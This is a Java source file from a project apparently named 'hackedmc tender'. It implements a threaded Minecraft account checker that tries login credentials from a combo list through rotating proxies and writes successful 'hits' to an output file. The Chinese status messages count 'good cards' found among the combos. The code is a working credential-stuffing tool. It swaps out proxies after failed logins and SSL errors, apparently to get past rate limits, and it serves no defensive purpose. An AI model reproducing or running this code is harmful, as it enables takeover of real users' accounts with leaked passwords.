package cn.hackedmc.tender.utils.accound;

import cn.hackedmc.tender.Main;
import cn.hackedmc.tender.utils.config.Config;
import cn.hackedmc.tender.utils.porxy.ProxyHelper;

import javax.net.ssl.SSLHandshakeException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;

public class AccountChecker extends Thread {

    private static final ArrayList<MCAccount> workingAccounts = new ArrayList<>();
    private static final ArrayList<MCAccount> checkedAccounts = new ArrayList<>();

    private final Config config;
    private static int origSize;

    public AccountChecker(Config config) {
        this.config = config;
    }

    @Override
    public void run() {
        ProxyHelper proxy = Main.getProxy();
        while (checkedAccounts.size() < origSize) {
//            Main.print(String.valueOf(checkedAccounts), Main.colorCyan);
            if (proxy == null) {
                proxy = Main.getProxy();
            }

            MCAccount minecraftAccount = Main.getAccount();
            if (checkedAccounts.contains(minecraftAccount))
                minecraftAccount = Main.getAccount();
            if (minecraftAccount == null) {
                break;
            }
            try {
                if (Main.checkedAlts.contains(minecraftAccount)) {

                    continue;
                }
                Main.checkedAlts.add(minecraftAccount);
//                Main.print(String.valueOf(checkedAccounts), Main.colorCyan);
                if (AltHelper.login(minecraftAccount, proxy)) {
                    Main.print("Hit:" + minecraftAccount, Main.ANSI_GREEN);

                    if (!workingAccounts.contains(minecraftAccount)) {
                        workingAccounts.add(minecraftAccount);
//                        Main.print(String.valueOf(checkedAccounts), Main.colorCyan);
                        String fileString = minecraftAccount +"\n";
                        Files.write(config.getOutputFile().toPath(), fileString.getBytes(StandardCharsets.UTF_8), StandardOpenOption.APPEND);
                    }
                    if (!checkedAccounts.contains(minecraftAccount))
                        checkedAccounts.add(minecraftAccount);

                    removeDuplicates();
                    Main.alts.remove(minecraftAccount);
                } else {
//                    Main.print(String.valueOf(checkedAccounts), Main.colorCyan);
                    proxy.incLoginFails();
                    if (proxy.getLoginFails() >= 3) {
                        ProxyHelper newProxy = new ProxyHelper(proxy.getIp(), proxy.getPort(), proxy.getType());
                        Main.proxies.remove(proxy);
                        proxy = Main.getProxy();
                        Main.proxies.add(newProxy);
                    }
                    else {
                        minecraftAccount.incFailCount();
                        if (minecraftAccount.getFailCount() >= 5) {
                            checkedAccounts.add(minecraftAccount);
                            removeDuplicates();
                            Main.alts.remove(minecraftAccount);
                        }
                    }
                    if (config.isPrintFails())
                        Main.print("Bad: " + minecraftAccount, Main.ANSI_RED);
                }
            } catch (Exception e) {
//                System.out.println(e.getMessage());
//                e.printStackTrace(System.out);
                if (e instanceof SSLHandshakeException) {
                    if (config.isPrintFails())
                        Main.print("代理连接错误！删除代理：" + proxy, Main.ANSI_PURPLE);
                    Main.proxies.remove(proxy);
                }
                proxy = Main.getProxy();
            }
        }
        super.run();
    }

    public static void status() {
        removeDuplicates();
        if (checkedAccounts.size() >= origSize) Main.stop();
//        Main.print("OK啊，测试到了:" + checkedAccounts.size() + "张好卡，还有: " + workingAccounts.size() + "张卡没测，总共有" + origSize + "张Combo", Main.ANSI_YELLOW);
//        Main.print((origSize - checkedAccounts.size()) + "张卡是坏的，还有" + Main.proxies.size() + "张代理", Main.ANSI_YELLOW);
    }

    public static void done() {
        Main.print("完成辣，测到了" + workingAccounts.size() + "张好卡从" + origSize + "张Combo中！", Main.ANSI_YELLOW);
    }

    private static void removeDuplicates() {
        removeDuplicateChecked();
        removeDuplicateWorking();
    }

    private static void removeDuplicateChecked() {
        ArrayList<MCAccount> temp = new ArrayList<>();
        for (MCAccount checkedAccount : checkedAccounts) {
            if (!temp.contains(checkedAccount))
                temp.add(checkedAccount);
        }
        checkedAccounts.clear();
        checkedAccounts.addAll(temp);
    }

    private static void removeDuplicateWorking() {
        ArrayList<MCAccount> temp = new ArrayList<>();
        for (MCAccount checkedAccount : workingAccounts) {
            if (!temp.contains(checkedAccount))
                temp.add(checkedAccount);
        }
        workingAccounts.clear();
        workingAccounts.addAll(temp);
    }

    public static void setOrigSize(int origSize) {
        AccountChecker.origSize = origSize;
    }
}